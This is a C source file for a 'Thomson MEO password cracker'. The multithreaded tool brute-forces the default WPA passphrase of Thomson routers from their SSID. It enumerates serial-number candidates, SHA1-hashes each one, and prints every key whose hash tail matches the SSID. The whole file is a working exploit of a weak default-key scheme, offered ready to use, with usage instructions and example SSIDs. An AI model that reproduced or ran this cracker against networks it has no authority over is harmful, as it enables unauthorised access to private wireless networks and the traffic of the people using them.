#include <stdio.h>
#include <unistd.h>
#include <pthread.h>

#ifdef LIBGCRYPT
#include <gcrypt.h>
#endif

#ifdef LIBCRYPTO
#include <openssl/sha.h>
#endif

#ifdef LIBTOMCRYPT
#include <tomcrypt.h>
#endif



char *dict, *found_keys;
unsigned char *ssid;
int sha_len, ssid_size, n_found=0;
int YEARS[] = {6, 7, 8, 9, 10, 5, 4, 3, 2, 1, 0};
pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;



typedef struct {
	int id;
	int start;
	int end;
} bf_arg;



//Get number of CPU hardware threads.
int num_threads() {
	int n_threads = sysconf(_SC_NPROCESSORS_ONLN);
	if (n_threads < 1)
		return 1;
	return n_threads;
}



//Free everything ;)
void cleanup() {
	free(dict);
	free(ssid);
	if (found_keys != NULL)
		free(found_keys);
}



//Create alphabet table for generating the XXX portion of serial number
void fill_dict(char *ab) {
	int i;
	for (i=0; i<36; i++) {
		if (i<10)
			ab[i] = i+48;
		else
			ab[i] = i+55;
	}
}

//Fill xxx array with all possible iterations for XXX values
void generate_xxx(char *ab, char *xxx) {
	int x, y, z;
	for (x=35; x>=0; x--) {
		for (y=35; y>=0; y--) {
			for (z=35; z>=0; z--) {
				sprintf(xxx, "%.2X%.2X%.2X", ab[x], ab[y], ab[z]);
				xxx += 7;
			}
		}
	}
}



void brute_force(bf_arg *arg) {
	//Lets brute force it ;)
	int year, week, i, j;
	char *m_number = malloc(13*sizeof(char));
	m_number[12] = '\0';
	unsigned char *sha = malloc(sha_len);
	unsigned char *cmp_offset_ptr = sha+sha_len-ssid_size;
	char *iter;

#ifdef LIBTOMCRYPT
	hash_state md;
#endif

	for (j=0; j<(sizeof(YEARS)/sizeof(int)); j++) {
		year = YEARS[j];
		sprintf(m_number, "CP%.2d", year);
		for (week=(*arg).end; week>(*arg).start; week--) {
			iter = dict;
			sprintf(m_number+4, "%.2d", week);
			for(i=0; i<46656; i++) {
				memcpy(m_number+6, iter, 6);
				iter += 7;
#ifdef LIBGCRYPT
				gcry_md_hash_buffer(GCRY_MD_SHA1, sha, m_number, 12);
#endif
#ifdef LIBCRYPTO
				SHA1(m_number, 12, sha);
#endif
#ifdef LIBTOMCRYPT
				sha1_init(&md);
				sha1_process(&md, m_number, 12);
				sha1_done(&md, sha);
#endif

				if (!memcmp(ssid, cmp_offset_ptr, ssid_size)) {
					pthread_mutex_lock(&mutex);
					n_found++;
					found_keys = realloc(found_keys, n_found*11);
					sprintf((n_found-1)*11+found_keys, "%.2X%.2X%.2X%.2X%.2X", sha[0], sha[1], sha[2], sha[3], sha[4]);
					pthread_mutex_unlock(&mutex);
				}
			}
		}
	}

  end:
	free(m_number);
	free(sha);
}



int main(int argc, char **argv) {
	int i;
	char ab[36];
	dict = malloc(46656*sizeof(char)*7);
	sha_len = 20;
	ssid_size = 3*sizeof(char);
	ssid = malloc(ssid_size);
	int n_threads = num_threads() + 1;
	pthread_t threads[n_threads];


	printf("\n\
/*********************************************************/\n\
/* Thomson MEO password cracker.                         */\n\
/* Based on algorithm documented at http://fodi.me/      */\n\
/*                                                       */\n\
/*********************************************************/\n\n");


	//Handle command line args
	char *tmp = malloc(14*sizeof(char));
	if (argc == 1) {
		printf("Insert SSID to crack: ");
		char *lele = fgets(tmp, 14, stdin);
		int idx = strcspn(tmp, "\n");
		tmp[idx] = '\0';
	}
	else if (argc != 2) {
		printf("\
Thomson MEO SSID calculator. Usage:\n\n\
\t%s SSID\n\n\
you can omit the \"Thomson\" part or include it.\n\n\
Examples:\n\n\
\t%s ThomsonA1B2C3\n\
\t%s A1B2C3\n\n\
Both examples are equivalent.\n\n\n", argv[0], argv[0], argv[0]);
		cleanup();
		return 0;
	}
	else {
		strcpy(tmp, argv[1]+(strlen(argv[1])-6));
	}
	sscanf(tmp+(strlen(tmp)-6), "%2X%2X%2X", ssid, ssid+1, ssid+2);
	free(tmp);


	//Create all permutations of the XXX part of serial number for brute forcing
	printf("\nSearching WPA for SSID Thomson%.2X%.2X%.2X\n", ssid[0], ssid[1], ssid[2]);
	fill_dict(ab);
	generate_xxx(ab, dict);


	//Create threads dividing the available work.
	printf("\nFound %d CPU hw threads - Starting %d workers...\nPlease wait a few minutes...\n\n", num_threads(), n_threads);
	pthread_mutex_init(&mutex, NULL);
	int week_range = 52 / n_threads;
	int remainder = 52 % n_threads;
	bf_arg t_args[n_threads];
	for (i=0; i<n_threads; i++) {
		t_args[i].id = i;
		t_args[i].end = i*week_range+week_range;
		t_args[i].start = t_args[i].end-week_range;
		if (i == (n_threads-1)) t_args[i].end += remainder;
		pthread_create(&(threads[i]), NULL, &brute_force, t_args+i);
	}


	//Wait for threads to finish...
	for (i=0; i<n_threads; i++)
		pthread_join(threads[i], NULL);
	pthread_mutex_destroy(&mutex);

	if (n_found) {
		printf("Possible keys for this SSID:\n\n");
		for (i=0; i<n_found; i++)
			printf("%s\n", found_keys+(i*11));
	}
	else {
		printf("No keys found for this SSID... :(\n");
	}
	printf("\n\n\nPress Enter to exit...");
	getchar();

	//Clean up and exit.
	cleanup();
	return 0;
}
